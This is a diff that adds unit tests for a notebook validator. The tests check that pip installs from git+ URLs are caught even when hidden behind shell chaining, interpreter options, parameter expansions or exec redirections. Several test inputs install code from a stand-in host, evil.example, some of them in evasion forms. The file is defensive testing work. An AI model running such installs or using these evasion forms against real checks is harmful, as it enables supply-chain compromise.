@@ -3212,3 +3212,113 @@ def test_exec_ends_the_command_list():
         (inv.action, inv.packages)
         for inv in nv.unconditional_pip_invocations("!echo $(exec true); pip install b")
     ] == [("install", ["b"])]
+
+
+def test_an_intervening_command_breaks_the_and_chain():
+    """`A && B` succeeds only when BOTH did, so a command that may fail ends the assumption.
+
+    Holding the assumed-success state once any pip command had appeared replayed an
+    unreachable install and suppressed R-INST-004 on the pair really installed.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        flag
+        for _, flag in nv._split_chained(
+            '!pip install "torch==2.11.0" && some_probe && pip install "torchcodec==0.11.0"'
+        )
+    ] == [False, False, True]
+    # The ordinary chained idiom is untouched, and `||` still carries the list either way,
+    # because one branch succeeding is enough.
+    assert [flag for _, flag in nv._split_chained("!pip install a && pip install b")] == [
+        False,
+        False,
+    ]
+    assert [
+        flag for _, flag in nv._split_chained("!pip install a || echo failed && pip install c")
+    ] == [False, True, False]
+    # A `;` starts a new and-or list, so nothing before it carries across.
+    assert [flag for _, flag in nv._split_chained("!probe; pip install a && pip install b")] == [
+        False,
+        False,
+        False,
+    ]
+
+
+def test_interpreter_options_may_take_an_operand():
+    """`python --help` documents `-W arg` and `-X opt`, attached or separate.
+
+    Accepting only self-contained option tokens before `-m` meant `python -W ignore -m pip
+    install git+...` produced no invocation and bypassed the git+ ban entirely.
+    """
+    nv = _load_notebook_validator_module()
+
+    for interpreter in (
+        "python -W ignore -m pip",
+        "python -Wignore -m pip",
+        "python -X dev -m pip",
+        "python -Xdev -m pip",
+        "python3 -W ignore -X dev -m pip",
+        "python --check-hash-based-pycs always -m pip",
+        "python -I -m pip",
+        "python -m pip",
+    ):
+        cell = f"!{interpreter} install git+https://evil.example/pkg.git"
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], interpreter
+    # A script path before `-m` is still not an option, so it runs no pip.
+    assert nv.PIP_LINE_RE.match("!python setup.py -m pip install x") is None
+
+
+def test_a_parameter_expansion_keeps_its_whitespace():
+    """bash keeps `TOKEN=${TOKEN:-a b}` as ONE assignment word.
+
+    Tracking only `$( )` ended the word at that space and left `b}` as the supposed
+    executable, so the pip command behind it was never seen.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._split_first_word("TOKEN=${TOKEN:-a b} pip install x") == (
+        "TOKEN=${TOKEN:-a b}",
+        "pip install x",
+    )
+    assert nv._split_first_word("T=${A:-${B:-x y}} pip install z") == (
+        "T=${A:-${B:-x y}}",
+        "pip install z",
+    )
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!TOKEN=${TOKEN:-a b} pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+
+
+def test_a_redirection_only_exec_hands_nothing_over():
+    """`exec` with no utility just makes its redirections permanent; the shell carries on.
+
+    Verified locally: `exec >/dev/null; printf x >&2` still runs the second command. Treating
+    every leading `exec` as a hand-over truncated the line before the pip call.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!exec >/tmp/install.log; pip install git+https://evil.example/pkg.git",
+            "nb.ipynb",
+            0,
+        )
+    ] == ["R-INST-001"]
+    for redirection_only in ("exec >/tmp/x", "exec > /tmp/x", "exec 2>&1", "exec <in.txt"):
+        assert nv._command_execs(f"!{redirection_only}") is False, redirection_only
+    # A utility after the redirections is still a hand-over, options and all.
+    for handover in ("exec pip install a", "exec -a name pip install a", "exec >/tmp/l pip x"):
+        assert nv._command_execs(f"!{handover}") is True, handover
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!exec pip install torch==2.11.0; pip install torch==2.12.0"
+        )
+    ] == [("install", ["torch==2.11.0"])]
